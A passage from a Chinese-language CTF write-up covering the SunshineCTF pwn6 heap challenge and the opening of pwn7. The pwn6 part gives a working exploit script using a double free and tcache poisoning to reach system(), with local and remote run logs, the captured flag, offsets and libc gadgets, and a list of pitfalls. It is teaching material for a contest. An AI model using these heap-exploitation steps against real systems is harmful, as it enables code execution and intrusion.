    \CommentTok{\# 1) PIE leak：指令 0x16 dump 出 0x40c0 起 240 bytes（加密傳送，我們自己解）}
\NormalTok{    dump }\OperatorTok{=}\NormalTok{ cb.dump()}
\NormalTok{    base }\OperatorTok{=}\NormalTok{ u64(dump[}\DecValTok{2}\NormalTok{:}\DecValTok{10}\NormalTok{]) }\OperatorTok{{-}}\NormalTok{ OFF\_STUB        }\CommentTok{\# dump[0]=0x16, dump[1]=0x00, 再來才是資料}
\NormalTok{    system\_plt }\OperatorTok{=}\NormalTok{ base }\OperatorTok{+}\NormalTok{ OFF\_SYSTEM}
\NormalTok{    func\_ptr   }\OperatorTok{=}\NormalTok{ base }\OperatorTok{+}\NormalTok{ OFF\_FUNC\_PTR}

    \CommentTok{\# 2) 製造 double free}
\NormalTok{    cb.alloc(IDX\_VICTIM, CHUNK, }\StringTok{b\textquotesingle{}A\textquotesingle{}} \OperatorTok{*}\NormalTok{ CHUNK)  }\CommentTok{\# slot0.ptr = P}
\NormalTok{    cb.clone(IDX\_ALIAS, IDX\_VICTIM)            }\CommentTok{\# slot1 = slot0（共用 P）}
\NormalTok{    cb.free(IDX\_VICTIM)                        }\CommentTok{\# free(P)，但 slot0.ptr 仍留著（refcount 1）}
\NormalTok{    cb.write(IDX\_VICTIM, }\DecValTok{16}\NormalTok{, }\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}} \OperatorTok{*} \DecValTok{16}\NormalTok{)     }\CommentTok{\# UAF write：把 tcache 的 next / key 清 0}
\NormalTok{    cb.free(IDX\_ALIAS)                         }\CommentTok{\# 再 free(P) 一次 → double free 成功}

    \CommentTok{\# 3) heap leak：UAF read 讀 P 的前 16 bytes}
\NormalTok{    leak }\OperatorTok{=}\NormalTok{ cb.read(IDX\_VICTIM)}
\NormalTok{    stored\_next }\OperatorTok{=}\NormalTok{ u64(leak[}\DecValTok{0}\NormalTok{:}\DecValTok{8}\NormalTok{])               }\CommentTok{\# = P \^{} (P \textgreater{}\textgreater{} 12)（自我參照環）}
\NormalTok{    P }\OperatorTok{=}\NormalTok{ reveal(stored\_next)                    }\CommentTok{\# 迭代解出 P}
    \CommentTok{\# ✶ P = malloc 回傳的 user 位址（chunk 標頭是 P {-} 0x10，別拿去 XOR）}

    \CommentTok{\# 4) tcache poisoning：把 P 的 next 設成 0x40c0（編碼時要 XOR (P\textgreater{}\textgreater{}12)）}
\NormalTok{    cb.write(IDX\_VICTIM, }\DecValTok{16}\NormalTok{, p64(func\_ptr }\OperatorTok{\^{}}\NormalTok{ (P }\OperatorTok{\textgreater{}\textgreater{}} \DecValTok{12}\NormalTok{)) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{0}\NormalTok{))}

    \CommentTok{\# 5) 兩次 alloc：第一次拿回 P，第二次就拿回 TARGET}
\NormalTok{    cb.alloc(IDX\_TMP, CHUNK, }\StringTok{b\textquotesingle{}B\textquotesingle{}} \OperatorTok{*}\NormalTok{ CHUNK)}
\NormalTok{    cb.alloc(IDX\_TARGET, CHUNK, p64(system\_plt) }\OperatorTok{+} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x00}\StringTok{\textquotesingle{}} \OperatorTok{*}\NormalTok{ (CHUNK }\OperatorTok{{-}} \DecValTok{8}\NormalTok{))  }\CommentTok{\# 寫入 0x40c0}

    \CommentTok{\# 6) 驗證 + 觸發：cmd 0x15 會 call [0x40c0](我們的字串) = system(我們的字串)}
\NormalTok{    back }\OperatorTok{=}\NormalTok{ cb.read(IDX\_TARGET)}
    \ControlFlowTok{assert}\NormalTok{ u64(back[}\DecValTok{0}\NormalTok{:}\DecValTok{8}\NormalTok{]) }\OperatorTok{==}\NormalTok{ system\_plt}
\NormalTok{    cb.cmd(}\StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}x15}\StringTok{\textquotesingle{}} \OperatorTok{+} \StringTok{b\textquotesingle{}cat flag.txt /flag /home/*/flag.txt 2\textgreater{}/dev/null; ls {-}la; id; echo DONE\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\begin{quote}
為什麼第 5 步的 \texttt{alloc} 不會壞？ \texttt{cmd\ \allowbreak{}0x10} 會
\texttt{memcpy(slot.\allowbreak{}ptr,\allowbreak{}\ \allowbreak{}msg+4,\allowbreak{}\ \allowbreak{}size)}，也就是把我們的 0x80 bytes
\textbf{寫到 \texttt{0x40c0}}，第一個 8 bytes 就是
\texttt{system@plt}，其它填 0（\texttt{0x40c8} 之後只是版本字串／
空槽，不影響程式邏輯）。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{8. 實際輸出}\label{ux5be6ux969bux8f38ux51fa}

\paragraph{\texorpdfstring{8.1
本機（\texttt{printf\ \allowbreak{}\textquotesingle{}\allowbreak{}sun\{\allowbreak{}local\_\allowbreak{}test\_\allowbreak{}flag\}\allowbreak{}\textquotesingle{}\allowbreak{}\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}flag.\allowbreak{}txt}）}{8.1 本機（printf \textquotesingle sun\{local\_test\_flag\}\textquotesingle{} \textgreater{} flag.txt）}}\label{ux672cux6a5fprintf-sunlocal_test_flag-flag.txt}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
$ python3 exploit.py
[x] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2'
[+] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2': pid 3544661
[+] handshake ok, key schedule = c019d1695f0ac1565baaa2db1d5b4b0e
[+] PIE base = 0x7f60fba50000
[*] target function pointer @ 0x7f60fba540c0  ->  system@plt 0x7f60fba51150
[+] heap leak: stored_next=0x5550d95af4a3 tcache_key=0x78d66b85f51864dd
[+] victim P (malloc user ptr) = 0x55558c023480
[+] wrote system@plt into <0x7f60fba540c0>
[+] verified: [0x7f60fba540c0] == 0x7f60fba51150
[*] triggering system(b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE')
sun{local_test_flag}
total 2520
drwxr-xr-x  2 kzzz kzzz    4096 Sep 28 01:01 .
drwxr-xr-x 10 kzzz kzzz    4096 Sep 28 00:14 ..
... （ls -la 的其餘行省略）
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE
HQ▒▒▒M▒t▒u▒▒Y0▒▒▒▒G▒`J▒▒▒▒-6▒ Z▒        ← ✶ 見下方說明（cmd 0x15 的回音）
2-\▒▒▒▒▒▒▒▒▒▒▒P▒▒▒▒P▒▒▒▒  ▒
FLAG: sun{local_test_flag}
[*] local test flag -> FLAG.txt left untouched
[*] Stopped process '/home/kzzz/Documents/code/ctf/sunshine/pwn6/./ld-linux-x86-64.so.2' (pid 3544661)
\end{Verbatim}

\begin{quote}
※提示 \textbf{新手最常以為「我跑壞了」的四件事} 1. 前兩行
\texttt{{[}x{]}\ \allowbreak{}Starting\ \allowbreak{}local\ \allowbreak{}process\ \allowbreak{}...} /
\texttt{{[}+{]}\ \allowbreak{}Starting\ \allowbreak{}local\ \allowbreak{}process\ \allowbreak{}...:\allowbreak{}\ \allowbreak{}pid\ \allowbreak{}NNNN} 是
\textbf{pwntools} 印的，不是程式輸出。 2.
\texttt{{[}+{]}\ \allowbreak{}victim\ \allowbreak{}P\ \allowbreak{}(malloc\ \allowbreak{}user\ \allowbreak{}ptr)\ \allowbreak{}=\ \allowbreak{}...} 的 \texttt{P}
是 \textbf{\texttt{malloc} 回傳的 user 位址}（不是 chunk 標頭， 標頭是
\texttt{P\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x10}，見 §3.5 (1) 與 §4.3）。 3. \textbf{\texttt{DONE}
後面那一大串非 ASCII 亂碼是正常的}：\texttt{cmd\ \allowbreak{}0x15} 的處理器在呼叫完
\texttt{{[}0x40c0{]}} 之後，還會把「收到的 cmd
內容」加密後回音一次（§2.11 的 1a50\textasciitilde1a71）， 所以 socket
上一定會有這串二進位。它不影響 flag。
討厭看到它的話：\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}tr\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}000\textquotesingle{}\allowbreak{}}（本筆記就是這樣截的）。
4. 本地測試\textbf{不會}覆蓋
\texttt{FLAG.\allowbreak{}txt}（\texttt{{[}*{]}\ \allowbreak{}local\ \allowbreak{}test\ \allowbreak{}flag\ \allowbreak{}-\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}FLAG.\allowbreak{}txt\ \allowbreak{}left\ \allowbreak{}untouched}）------
不然打過遠端再跑本地就會把真 flag 蓋掉。
\end{quote}

\paragraph{\texorpdfstring{8.2
遠端（\texttt{python3\ \allowbreak{}exploit.\allowbreak{}py\ \allowbreak{}REMOTE} →
\texttt{chal.\allowbreak{}sunshinectf.\allowbreak{}games:\allowbreak{}26005}）}{8.2 遠端（python3 exploit.py REMOTE → chal.sunshinectf.games:26005）}}\label{ux9060ux7aefpython3-exploit.py-remote-chal.sunshinectf.games26005}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[x] Opening connection to chal.sunshinectf.games on port 26005
[x] Opening connection to chal.sunshinectf.games on port 26005: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26005: Done
[+] handshake ok, key schedule = bff3be995bde2cb4802912e5a4d6ee70
[+] PIE base = 0x5de6e835c000
[*] target function pointer @ 0x5de6e83600c0  ->  system@plt 0x5de6e835d150
[+] heap leak: stored_next=0x5de2c80773e1 tcache_key=0xa5cac8477d07e250
[+] victim P (malloc user ptr) = 0x5de716761480
[+] wrote system@plt into <0x5de6e83600c0>
[+] verified: [0x5de6e83600c0] == 0x5de6e835d150
[*] triggering system(b'cat flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id; echo DONE')
sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}
total 12
drwxr-xr-x 2 root root         4096 Sep 26 00:21 .
drwxr-xr-x 1 root root         4096 Sep 26 00:54 ..
-rw-r----- 1 root code_breaker   36 Sep 26 00:13 flag.txt
uid=1337(code_breaker) gid=1337(code_breaker) groups=1337(code_breaker)
DONE
HQ▒▒▒▒M t▒u▒▒Y0▒▒p▒▒▒G▒`J▒▒▒▒▒▒-6▒ Z▒    ← ✶ 同一串二進位回音（見 §8.1 說明）
2-\▒▒▒▒▒▒▒▒▒▒▒P▒▒▒▒P▒▒▒▒  ▒
FLAG: sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}
[*] Closed connection to chal.sunshinectf.games port 26005
\end{Verbatim}

\begin{quote}
※提示 遠端連線 pwntools
也會印「兩行」：\texttt{{[}x{]}\ \allowbreak{}...\allowbreak{}\ \allowbreak{}Trying\ \allowbreak{}35.\allowbreak{}211.\allowbreak{}211.\allowbreak{}18}（開始嘗試）
與 \texttt{{[}+{]}\ \allowbreak{}...\allowbreak{}\ \allowbreak{}Done}（成功）。只看到一行不代表只做了一次動作。
\end{quote}

\paragraph{8.3 真實 flag}\label{ux771fux5be6-flag-1}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}
\end{Verbatim}

（也存成 \texttt{FLAG.\allowbreak{}txt}。用
\texttt{re.\allowbreak{}search(rb\textquotesingle{}\allowbreak{}sun\textbackslash{}\allowbreak{}\{\allowbreak{}{[}\^\allowbreak{}{}\allowbreak{}\}\allowbreak{}{]}*\textbackslash{}\allowbreak{}\}\allowbreak{}\textquotesingle{}\allowbreak{},\allowbreak{}\ \allowbreak{}out)}
從輸出中撈出來。）

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{9.
常見坑（我這次真的踩到的都列出來）}\label{ux5e38ux898bux5751ux6211ux9019ux6b21ux771fux7684ux8e29ux5230ux7684ux90fdux5217ux51faux4f86}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{\texttt{\_\allowbreak{}\_\allowbreak{}memcpy\_\allowbreak{}chk} 會 abort}
  \texttt{\_\allowbreak{}\_\allowbreak{}memcpy\_\allowbreak{}chk(dest,\allowbreak{}\ \allowbreak{}src,\allowbreak{}\ \allowbreak{}n,\allowbreak{}\ \allowbreak{}destlen)}：只要
  \texttt{n\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}destlen} 就呼叫 \texttt{\_\allowbreak{}\_\allowbreak{}chk\_\allowbreak{}fail} →
  \texttt{abort()}。它\textbf{不會}幫你擋「dest 實際比 destlen
  小」的情況， 所以 destlen 常常是編譯器寫死的常數（本題 cmd 0x15 寫
  \texttt{0x1000}、cmd 0x10 寫 \texttt{size}）。 看到它就先確認「destlen
  是不是跟真正的緩衝區一樣大」。
\item
  \textbf{\texttt{movaps} / 16-byte 對齊} ROP 時 \texttt{rsp}
  沒對齊會死在 libc 的 \texttt{movaps}；解法是在 chain 前面多放一個
  \texttt{ret}。 本題走函式指標覆寫，天然對齊，不用管。
\item
  \textbf{bundled libc 與系統 ld 不相容} \texttt{./\allowbreak{}code\_\allowbreak{}breaker}
  直接跑會出現
  \texttt{undefined\ \allowbreak{}symbol:\allowbreak{}\ \allowbreak{}\_\allowbreak{}\_\allowbreak{}nptl\_\allowbreak{}change\_\allowbreak{}stack\_\allowbreak{}perm,\allowbreak{}\ \allowbreak{}version\ \allowbreak{}GLIBC\_\allowbreak{}PRIVATE}。
  一定要用題目的
  ld：\texttt{./\allowbreak{}ld-\allowbreak{}linux-\allowbreak{}x86-\allowbreak{}64.\allowbreak{}so.\allowbreak{}2\ \allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}library-\allowbreak{}path\ \allowbreak{}.\allowbreak{}\ \allowbreak{}./\allowbreak{}code\_\allowbreak{}breaker}。
\item
  \textbf{\texttt{\$\allowbreak{}ORIGIN} RUNPATH 只是「去哪裡找」} 它不會改變「用哪個
  interpreter」。\texttt{patchelf\ \allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}set-\allowbreak{}interpreter}
  也可以（要先備份）。
\item
  \textbf{\texttt{/\allowbreak{}dev/\allowbreak{}urandom} 的 \texttt{fread} 短讀} 本題有檢查
  \texttt{cmp\ \allowbreak{}rax,\allowbreak{}0x10;\ \allowbreak{}jne\ \allowbreak{}失敗}，所以沒有「nonce 沒讀到 ⇒ 用殘留
  stack」的漏洞。
  這是\textbf{檢查過但不存在}的候選漏洞（順便學到：\texttt{fopen("/\allowbreak{}dev/\allowbreak{}urandom","r")}
  在某些環境 用 text mode 開、以及 \texttt{fread} 的參數順序
  \texttt{(ptr,\allowbreak{}\ \allowbreak{}size,\allowbreak{}\ \allowbreak{}nmemb,\allowbreak{}\ \allowbreak{}fp)} 都值得看）。
\item
  \textbf{\texttt{tcache\_\allowbreak{}key} 不是指標（glibc ≥ 2.34）}
  舊教學會說「free 後 chunk+8 是 \texttt{tcache} 指標，可以直接洩漏 heap
  base」。 2.34+ 之後那裡是\textbf{隨機值}，別被騙。本題改用
  safe-linking 的自我參照式解出 heap。
\item
  \textbf{safe-linking 別忘了 encode/decode} 寫入 tcache \texttt{next}
  時要寫
  \texttt{target\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}(P\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12)}，不是
  \texttt{target}；否則會拿到歪掉的指標， 通常表現為
  \texttt{malloc():\allowbreak{}\ \allowbreak{}unaligned\ \allowbreak{}tcache\ \allowbreak{}chunk\ \allowbreak{}detected} 或直接
  SIGSEGV。
\item
  \textbf{\texttt{tcache\_\allowbreak{}get} 會要求 16-byte 對齊} 假目標位址必須 16
  對齊（本題 \texttt{PIE+0x40c0} 剛好是）。
\item
  \textbf{協定的兩個「反直覺」細節}（我卡最久的地方）

  \begin{itemize}
  \tightlist
  \item
    長度前綴與 size 欄位都是 \textbf{big-endian}。
  \item
    加密用的 \texttt{K} 索引是 \textbf{訊息內的}
    \texttt{i\ \allowbreak{}\&\allowbreak{}\ \allowbreak{}0xf}，不是絕對 offset。
    寫錯的話「第一封訊息（counter=0）」會完全正常，\textbf{之後才開始爛}，非常難查。
  \end{itemize}
\item
  \textbf{pwntools 會偷走 \texttt{sys.\allowbreak{}argv} 裡的魔法參數}
  \texttt{from\ \allowbreak{}pwn\ \allowbreak{}import\ \allowbreak{}*} 會把 \texttt{REMOTE}、\texttt{DEBUG}
  這類參數從 \texttt{sys.\allowbreak{}argv} 移除， 改放到
  \texttt{args{[}\textquotesingle{}\allowbreak{}REMOTE\textquotesingle{}\allowbreak{}{]}}。所以
  \texttt{if\ \allowbreak{}len(sys.\allowbreak{}argv)\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}1\ \allowbreak{}and\ \allowbreak{}sys.\allowbreak{}argv{[}1{]}\ \allowbreak{}==\ \allowbreak{}\textquotesingle{}\allowbreak{}REMOTE\textquotesingle{}\allowbreak{}}
  \textbf{永遠是 False}！ 要用
  \texttt{if\ \allowbreak{}args{[}\textquotesingle{}\allowbreak{}REMOTE\textquotesingle{}\allowbreak{}{]}:}（本題
  exploit.py 兩種都支援）。
\item
  \textbf{\texttt{p16(x,\allowbreak{}\ \allowbreak{}\textquotesingle{}\allowbreak{}big\textquotesingle{}\allowbreak{})} 不是
  big-endian！} pwntools 的 \texttt{p16} 第二個「位置參數」不是
  endianness，\texttt{p16(1,\allowbreak{}\textquotesingle{}\allowbreak{}big\textquotesingle{}\allowbreak{})}
  會給你
  \texttt{\textbackslash{}\allowbreak{}x01\textbackslash{}\allowbreak{}x00}（little）。一定要寫成
  \textbf{\texttt{p16(x,\allowbreak{}\ \allowbreak{}endian=\textquotesingle{}\allowbreak{}big\textquotesingle{}\allowbreak{})}}。
  （我因此浪費了一輪
  debug，症狀是「指令一直被拒絕，但錯誤碼看起來很合理」。）
\item
  \textbf{不要用互動式 \texttt{/\allowbreak{}bin/\allowbreak{}sh}} 實測：\texttt{cmd\ \allowbreak{}0x15} 送
  \texttt{/\allowbreak{}bin/\allowbreak{}sh\textbackslash{}\allowbreak{}0} 之後，shell 的 stdin
  行為在某些環境下會直接結束
  （拿不到輸出）。\textbf{更穩的做法}是把整條命令一次交給
  \texttt{system()}：
  \texttt{cmd\ \allowbreak{}0x15\ \allowbreak{}+\ \allowbreak{}b\textquotesingle{}\allowbreak{}cat\ \allowbreak{}flag.\allowbreak{}txt\ \allowbreak{}/\allowbreak{}flag\ \allowbreak{}...;\ \allowbreak{}id;\ \allowbreak{}echo\ \allowbreak{}DONE\textquotesingle{}\allowbreak{}}，
  這樣不需要 TTY、不需要等待 shell 提示字元，輸出直接出現在 socket 上。
\item
  \textbf{canary 檢查失敗的症狀是 \texttt{abort()}，不是 SIGSEGV} 看到
  \texttt{***\ \allowbreak{}stack\ \allowbreak{}smashing\ \allowbreak{}detected\ \allowbreak{}***} 就代表你動到 canary 了。
\end{enumerate}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{附錄 A：重要 offset
一覽（全部已驗證）}\label{ux9644ux9304-aux91cdux8981-offset-ux4e00ux89bdux5168ux90e8ux5df2ux9a57ux8b49}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
PIE 相對 offset
  0x1150  system@plt                    （GOT 項在 0x4028）
  0x1390  endbr64; ret（stub，[0x40c0] 的初值）
  0x11c0  main
  0x1170  __memcpy_chk@plt
  0x1140  __stack_chk_fail@plt
  0x13a0  read_exact(fd 0)
  0x13f0  recv_message(len-prefixed)
  0x1450  send_message(len-prefixed, 明文)
  0x1510  send_message(加密)
  0x1670  handshake（nonce 交換 + 金鑰排程 + MAC 驗證）
  0x1900  指令主迴圈
  0x1a00  cmd 0x15：call [0x40c0](我們送的字串)      ✶ 觸發點
  0x1a80  cmd 0x14：clone（refcount bug）             ✶ 漏洞
  0x1ae8  cmd 0x13：free
  0x1b40  cmd 0x12：write（受 slot.size 限制）
  0x1bc0  cmd 0x11：read（UAF read）
  0x1c50  cmd 0x10：alloc
  0x1d08  cmd 0x16：dump 0x40c0..0x41b0（PIE leak）
  0x2040  S-box（256 bytes）
  0x2020  jump table（指令 0x10~0x16）
  0x2006  "/dev/urandom"   0x2004 "r"   0x2013 "true"

.bss
  0x40c0  被 cmd 0x15 呼叫的函式指標  ✶ 攻擊目標
  0x41c0  slot[16]（每個 0x10 bytes：ptr/size/refcount）
  0x42c0  收方 stream counter
  0x42c4  送方 stream counter
  0x42d0  K[16]

libc（題目附的 2.39）
  system     0x58740
  "/bin/sh"  0x1cb42f
  pop rdi;ret 0x10f75b      ret 0x2882f
\end{Verbatim}

\subsubsection{附錄
B：重現指令}\label{ux9644ux9304-bux91cdux73feux6307ux4ee4}

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ /home/kzzz/Documents/code/ctf/sunshine/pwn6}
\BuiltInTok{printf} \StringTok{\textquotesingle{}sun\{local\_test\_flag\}\textbackslash{}n\textquotesingle{}} \OperatorTok{\textgreater{}}\NormalTok{ flag.txt      }\CommentTok{\# 本機 dummy flag}
\ExtensionTok{python3}\NormalTok{ exploit.py }\KeywordTok{|} \FunctionTok{tr} \AttributeTok{{-}d} \StringTok{\textquotesingle{}\textbackslash{}000\textquotesingle{}}               \CommentTok{\# 打本機（過濾掉結尾的二進位回音）}
\ExtensionTok{python3}\NormalTok{ exploit.py REMOTE }\KeywordTok{|} \FunctionTok{tr} \AttributeTok{{-}d} \StringTok{\textquotesingle{}\textbackslash{}000\textquotesingle{}}        \CommentTok{\# 打 chal.sunshinectf.games:26005}
\FunctionTok{cat}\NormalTok{ FLAG.txt                                    }\CommentTok{\# 真實 flag}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  本機測試\textbf{不會覆蓋} \texttt{FLAG.\allowbreak{}txt}：exploit 只在「非本地
  dummy flag」或「\texttt{REMOTE} 模式」時
  才寫檔（訊息：\texttt{{[}*{]}\ \allowbreak{}local\ \allowbreak{}test\ \allowbreak{}flag\ \allowbreak{}-\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}FLAG.\allowbreak{}txt\ \allowbreak{}left\ \allowbreak{}untouched}）。所以
  「先打遠端、後跑本地」不會把真 flag 蓋掉。
\item
  用
  \texttt{tr\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}000\textquotesingle{}\allowbreak{}}
  只是讓輸出好看一點；不過濾也拿得到 flag（那個二進位回音見 §8.1）。
\end{itemize}

\paragraph{重現 §4.3 的 safe-linking gdb
實測}\label{ux91cdux73fe-4.3-ux7684-safe-linking-gdb-ux5be6ux6e2c}

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ /home/kzzz/Documents/code/ctf/sunshine/pwn6}
\FunctionTok{cat} \OperatorTok{\textgreater{}}\NormalTok{ /tmp/tr2.c }\OperatorTok{\textless{}\textless{}\textquotesingle{}EOF\textquotesingle{}}
\StringTok{\#include \textless{}stdio.h\textgreater{}}
\StringTok{\#include \textless{}stdlib.h\textgreater{}}
\StringTok{\#include \textless{}string.h\textgreater{}}
\StringTok{int main(void)\{}
\StringTok{    void *P = malloc(0x80);}
\StringTok{    memset(P, \textquotesingle{}A\textquotesingle{}, 0x80);}
\StringTok{    free(P);                 /* free \#1 */}
\StringTok{    printf("state{-}a\textbackslash{}n");     /* ← 中斷點 1（第 8 行） */}
\StringTok{    memset(P, 0, 16);        /* UAF write：清 next + key */}
\StringTok{    free(P);                 /* free \#2：double free */}
\StringTok{    printf("state{-}b\textbackslash{}n");     /* ← 中斷點 2（第 11 行） */}
\StringTok{    return 0;}
\StringTok{\}}
\OperatorTok{EOF}
\FunctionTok{gcc} \AttributeTok{{-}O0} \AttributeTok{{-}g} \AttributeTok{{-}o}\NormalTok{ /tmp/tr2 /tmp/tr2.c}
\FunctionTok{cp}\NormalTok{ /tmp/tr2 /tmp/tr2\_p}
\ExtensionTok{patchelf} \AttributeTok{{-}{-}set{-}interpreter} \StringTok{"}\VariableTok{$PWD}\StringTok{/ld{-}linux{-}x86{-}64.so.2"} \AttributeTok{{-}{-}set{-}rpath} \StringTok{"}\VariableTok{$PWD}\StringTok{"}\NormalTok{ /tmp/tr2\_p}
\FunctionTok{gdb} \AttributeTok{{-}q} \AttributeTok{{-}batch} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}break /tmp/tr2.c:8\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}break /tmp/tr2.c:11\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}run\textquotesingle{}} \DataTypeTok{\textbackslash{}}
  \AttributeTok{{-}ex} \StringTok{\textquotesingle{}printf "P=\%p P\textgreater{}\textgreater{}12=\%\#lx\textbackslash{}n", P, (unsigned long)P\textgreater{}\textgreater{}12\textquotesingle{}} \DataTypeTok{\textbackslash{}}
  \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/2gx P\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}continue\textquotesingle{}} \AttributeTok{{-}ex} \StringTok{\textquotesingle{}x/2gx P\textquotesingle{}}\NormalTok{ /tmp/tr2\_p}
\end{Highlighting}
\end{Shaded}

期望看到：第一次 \texttt{x/\allowbreak{}2gx\ \allowbreak{}P} 的 \texttt{next} 等於
\texttt{P\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12}，第二次等於
\texttt{P\ \allowbreak{}\^\allowbreak{}{}\allowbreak{}\ \allowbreak{}(P\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}12)} （完整實測值見
§4.3）。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\section{Part 8 --- pwn7 SafeHouse（Seccomp +
Pivot）}\label{part-8-pwn7-safehouseseccomp-pivot}

\begin{quote}
原始檔案：\texttt{pwn7/\allowbreak{}notes.\allowbreak{}md}
\end{quote}

\subsection{\texorpdfstring{pwn7 --- \texttt{SafeHouse}（技巧：seccomp
下的 stack pivot + 偽造 IPC 封包 +
負索引越界）}{pwn7 --- SafeHouse（技巧：seccomp 下的 stack pivot + 偽造 IPC 封包 + 負索引越界）}}\label{pwn7-safehouseux6280ux5de7seccomp-ux4e0bux7684-stack-pivot-ux507dux9020-ipc-ux5c01ux5305-ux8ca0ux7d22ux5f15ux8d8aux754c}

\begin{quote}
這一題比 pwn1 難不少。建議先讀完
\texttt{pwn1/\allowbreak{}notes.\allowbreak{}md}（那裡有暫存器、\texttt{call}/\texttt{ret}、
堆疊、syscall 的基礎），再回來看這篇。

這題的觀念重點： 1. \texttt{fork()} 之後「父子共用一個
socketpair」的架構 2. \textbf{seccomp} 是什麼、為什麼「不能
\texttt{execve}」會逼你換策略 3. \textbf{stack pivot}（把 \texttt{rsp}
搬到 \texttt{.\allowbreak{}bss}，因為堆疊位址我們不知道） 4. 手動組出正確的 binary
protocol（含 XOR 加解密、big-endian 長度） 5.
\textbf{有號數邊界檢查}（\texttt{jg} vs \texttt{ja}）造成的負索引越界
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{1. 題目資訊}\label{ux984cux76eeux8cc7ux8a0a-5}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
檔案：service
ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
\end{Verbatim}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
RELRO:      Full RELRO        ← GOT 不可寫，不能改 GOT
Stack:      No canary found   ← 可以直接覆蓋返回位址
NX:         NX enabled        ← 不能執行堆疊上的資料
PIE:        No PIE (0x400000) ← 程式碼位址固定，gadget 直接用
RUNPATH:    b'$ORIGIN'
SHSTK:      Enabled
IBT:        Enabled
\end{Verbatim}

\begin{quote}
※注意 \textbf{\texttt{SHSTK} / \texttt{IBT} 這兩個是 ELF
檔裡的屬性註記，不等於執行時有啟用。} \texttt{readelf\ \allowbreak{}-\allowbreak{}n\ \allowbreak{}service}
可以看到 \texttt{.\allowbreak{}note.\allowbreak{}gnu.\allowbreak{}property} 裡寫著
\texttt{x86\ \allowbreak{}feature:\allowbreak{}\ \allowbreak{}IBT,\allowbreak{}\ \allowbreak{}SHSTK}， 意思是「編譯時宣告這支程式支援
CET」。真正的影子堆疊（SHSTK）要 \textbf{CPU + 核心 +
執行緒}都開啟才會攔截 \texttt{ret}； 本題的 exploit 用\textbf{純
\texttt{ret} 的 ROP 就能成功}（本地與遠端都實測成功），
證明遠端並沒有啟用 SHSTK。所以看到 \texttt{SHSTK:\allowbreak{}\ \allowbreak{}Enabled} 先別放棄，
動手試過再說。（驗證方式：\texttt{readelf\ \allowbreak{}-\allowbreak{}n\ \allowbreak{}service}，以及觀察
\texttt{ret} 有沒有被擋。）
\end{quote}

\begin{quote}
※提示
\textbf{\texttt{RUNPATH:\allowbreak{}\ \allowbreak{}b\textquotesingle{}\allowbreak{}\$\allowbreak{}ORIGIN\textquotesingle{}\allowbreak{}}}
代表「執行時優先在 binary 自己的目錄找 \texttt{libc.\allowbreak{}so.\allowbreak{}6} /
